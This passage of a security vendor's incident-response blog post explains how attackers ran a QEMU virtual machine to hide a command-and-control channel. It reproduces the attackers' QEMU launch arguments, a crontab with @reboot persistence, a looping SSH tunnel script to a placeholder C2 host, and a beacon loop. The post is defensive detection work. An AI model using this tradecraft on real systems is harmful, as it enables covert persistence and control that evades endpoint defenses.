---
title: The Detection & Response Chronicles: Covert Operations Through QEMU
url: https://blog.nviso.eu/2026/06/04/the-detection-response-chronicles-covert-operations-through-qemu/
source: NVISO Labs
date: 2026-06-04
fetch_date: 2026-06-05T06:12:57.805405
---

# The Detection & Response Chronicles: Covert Operations Through QEMU

[Skip to content](#content)

[![NVISO Labs](https://blog.nviso.eu/wp-content/uploads/2022/12/cropped-abn-zcrj_400x400-1.png)](https://blog.nviso.eu/)

[NVISO Labs](https://blog.nviso.eu/)

Cyber security research, straight from the lab! 🐀

* [linkedin](https://www.linkedin.com/company/nviso-cyber)
* mail us
* [our company](https://www.nviso.eu)
* [SSO](https://blog.nviso.eu/wp-admin/edit.php)
* Search for:Search Button

Menu

* [All](https://blog.nviso.eu/)
* [Prevent](https://blog.nviso.eu/category/prevent/)
  + [Application Security](https://blog.nviso.eu/category/prevent/application-security/)
    - [IoT Security](https://blog.nviso.eu/category/prevent/iot-security/)
    - [Web Security](https://blog.nviso.eu/category/prevent/web-security/)
    - [Mobile Security](https://blog.nviso.eu/category/prevent/mobile-security/)
    - [Industrial Security](https://blog.nviso.eu/category/prevent/industrial-security/)
    - [AI Security](https://blog.nviso.eu/category/ai-security/)
  + [Cloud Security](https://blog.nviso.eu/category/prevent/cloud-security/)
    - [AWS](https://blog.nviso.eu/category/prevent/cloud-security/aws/)
    - [Azure](https://blog.nviso.eu/category/prevent/cloud-security/azure/)
    - [GCP](https://blog.nviso.eu/category/prevent/cloud-security/gcp/)
    - [Microsoft 365](https://blog.nviso.eu/category/prevent/cloud-security/microsoft-365/)
  + [Awareness](https://blog.nviso.eu/category/prevent/awareness/)
  + [Cyber Strategy](https://blog.nviso.eu/category/prevent/cyber-strategy/)
  + [Red Team](https://blog.nviso.eu/category/prevent/red-team/)
* [Detect](https://blog.nviso.eu/category/detect/)
  + [Blue Team](https://blog.nviso.eu/category/detect/blue-team/)
  + [Purple Team](https://blog.nviso.eu/category/detect/purple-team/)
* [Respond](https://blog.nviso.eu/category/respond/)
  + [Forensics](https://blog.nviso.eu/category/respond/forensics/)
* Other
  + [Events](https://blog.nviso.eu/category/events/)

# The Detection & Response Chronicles: Covert Operations Through QEMU

[Stamatis Chatzimangou](https://blog.nviso.eu/author/stamatis-chatzimangou/)

[SOC](https://blog.nviso.eu/category/soc/), [Blue Team](https://blog.nviso.eu/category/detect/blue-team/), [Detection Engineering](https://blog.nviso.eu/category/detection-engineering/), [Incident Response](https://blog.nviso.eu/category/incident-response/)

June 4, 2026June 4, 2026
11 Minutes

Adversaries have always relied on legitimate tools to carry out their attacks. These tools are already trusted by security solutions, which allows them to blend in with normal activity, maintain a low footprint, and make detection much harder for defenders. By using these legitimate tools, adversaries can carry out a wide range of actions, such as moving laterally across networks, establishing C2 channels, or maintaining persistence, all without triggering any alerts.

However, as defenders are catching up to their methods, adversaries must become increasingly inventive to stay ahead. A recent NVISO investigation highlighted this, with adversaries leveraging QEMU [1], an open-source machine emulator and virtualizer typically used for development and testing, to deploy virtual machines that contained and executed malicious payloads. This approach enabled them to maintain covert access and bypass host-based detection from AV and EDR solutions.

In this blog post, we take a look at different ways that QEMU can be abused by adversaries and explore detection and hunting opportunities.

## How QEMU Was Used in the Incident

After acquiring initial access in the environment by using a partner’s compromised account, the adversaries proceeded to establish a command and control channel for persistence by deploying and launching a QEMU virtual machine from a Linux disk image named *vault.db*. QEMU was launched with the following arguments:

```
qemu-system-x86_64.exe \
    -m 1G \
    -smp 1 \
    -hda vault.db \
    -device e1000,netdev=net0 \
    -netdev user,id=net0,hostfwd=tcp::22022-:22
```

```
qemu-system-x86_64.exe \
    -m 1G \
    -smp 1 \
    -hda vault.db \
    -device e1000,netdev=net0 \
    -netdev user,id=net0,hostfwd=tcp::22022-:22
```

Bash

To better understand how QEMU was executed, we will break down the command line arguments:

* **-m 1G**: Gives the VM 1 GB of RAM.
* **-smp 1**: Gives the VM 1 virtual CPU.
* **-hda vault.db**: Uses vault.db as the VM’s hard disk image.
* **-device e1000,netdev=net0**: Adds an Intel E1000 virtual network card.
* **-netdev user,id=net0,hostfwd=tcp::22022-:22**: Enables user-mode networking and forwards host port 22022 to guest port 22 for SSH access.

Inside the VM, persistence and a command and control channel were established through the root crontab that launched two scripts at boot:

```
/etc/crontabs/root
# do daily/weekly/monthly maintenance
# min hour day month weekday command
*/15 * * * * run-parts /etc/periodic/15min
0 * * * * run-parts /etc/periodic/hourly
0 2 * * * run-parts /etc/periodic/daily
0 3 * * 6 run-parts /etc/periodic/weekly
0 5 1 * * run-parts /etc/periodic/monthly

@reboot /bin/sh /sbin/syslogda.sh>/dev/null 2>&1
@reboot /bin/sh /sbin/syslogdb.sh>/dev/null 2>&1
```

```
/etc/crontabs/root
# do daily/weekly/monthly maintenance
# min hour day month weekday command
*/15 * * * * run-parts /etc/periodic/15min
0 * * * * run-parts /etc/periodic/hourly
0 2 * * * run-parts /etc/periodic/daily
0 3 * * 6 run-parts /etc/periodic/weekly
0 5 1 * * run-parts /etc/periodic/monthly

@reboot /bin/sh /sbin/syslogda.sh>/dev/null 2>&1
@reboot /bin/sh /sbin/syslogdb.sh>/dev/null 2>&1
```

Plaintext

The script **syslogdb.sh** maintained an SSH connection to the C2 server over TCP 443 and forwarded local port 33443 to the C2 server through this tunnel.

```
while true;

    do ssh
           -o "StrictHostKeyChecking=no" \
           -o "ServerAliveInterval=5" \
           -o "ExitOnForwardFailure=yes" \
           -o "ConnectTimeout=10" \
           <user>@<c2_ip> -p 443 \
           -L 127.0.0.1:33443:127.0.0.1:33443 \
           -N;
           sleep 15;
done
```

```
while true;

    do ssh
           -o "StrictHostKeyChecking=no" \
           -o "ServerAliveInterval=5" \
           -o "ExitOnForwardFailure=yes" \
           -o "ConnectTimeout=10" \
           <user>@<c2_ip> -p 443 \
           -L 127.0.0.1:33443:127.0.0.1:33443 \
           -N;
           sleep 15;
done
```

Bash

* **-o “StrictHostKeyChecking=no”**: Automatically trusts the server the first time it connects (no prompt to verify fingerprint).
* **-o “ServerAliveInterval=5”**: Sends a keepalive packet every 5 seconds to detect dead connections quickly.
* **-o “ExitOnForwardFailure=yes”**: If port forwarding cannot be established, SSH exits immediately, so the loop retries.
* **-o “ConnectTimeout=10”**: Gives up if it cannot connect within 10 seconds.

The other script, **syslogda.sh**, executed an Adaptix [2][3] Gopher beacon (discover) that communicated with the Adaptix server indirectly through the SSH tunnel port 33443 rather than by connecting to the server directly. As a result, the beacon’s local traffic was carried over the encrypted SSH channel to remote infrastructure, enabling command-and-control communication while blending into normal outbound traffic.

```
#!/bin/sh
while true;
    do /sbin/discover;
    sleep 15;
done
```

```
#!/bin/sh
while true;
    do /sbin/discover;
    sleep 15;
done
```

Bash

The C2 communication through the QEMU image can be seen in the diagram below.

![](https://blog.nviso.eu/wp-content/uploads/2026/01/qemu-adaptix2-1.png)

Communication via QEMU image and AdaptixC2

Following the establishment of command and control, additional actions were performed in the environment by the adversary, which are outside the scope of this blog post.

Although this may seem like an overly complicated way to establish a command and control channel, it comes with a few advantages for the adversaries:

* **Isolation from the host**: Using a virtual machine sepa...